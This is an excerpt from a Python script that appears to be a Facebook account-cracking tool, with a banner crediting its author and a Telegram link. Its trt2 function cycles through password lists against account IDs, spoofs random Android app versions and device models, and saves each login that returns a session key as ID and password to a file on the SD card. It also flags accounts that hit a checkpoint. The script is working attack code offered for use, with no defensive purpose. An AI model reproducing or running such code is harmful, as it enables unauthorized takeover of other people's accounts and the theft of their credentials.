...
\033[38;5;46m                                                                          
\033[1;99m==============================================================================
\033[1;32m[✓]AUTHOR  :\033[1;32m MINHAJ
\033[1;32m[✓]TOOL    :\033[1;32m NEW 
\033[1;32m[✓]FACEBOOK:\033[1;32m Minhaj Hossain
\033[1;32m[✓]VERSION :\033[1;32m 0.1
\033[1;32m[✓]STATUS  :\033[1;32m free + paid
\033[1;95m===============================================================""")
def linex():
	print(50*'_')
def clear():
...
def menu():
		...
		#	linex()
			...
			os.system('xdg-open https://t.me/+CsRNaRVf4_JlY2Y1')
			if xd in ['1','01']:
				clear()
...
def trt2(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [Mr.MMH-RANDOM] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [Mr.MMH-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/MMH-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [Mr.MMH-CP] '+ids+' | '+pas+'\033[1;97m')
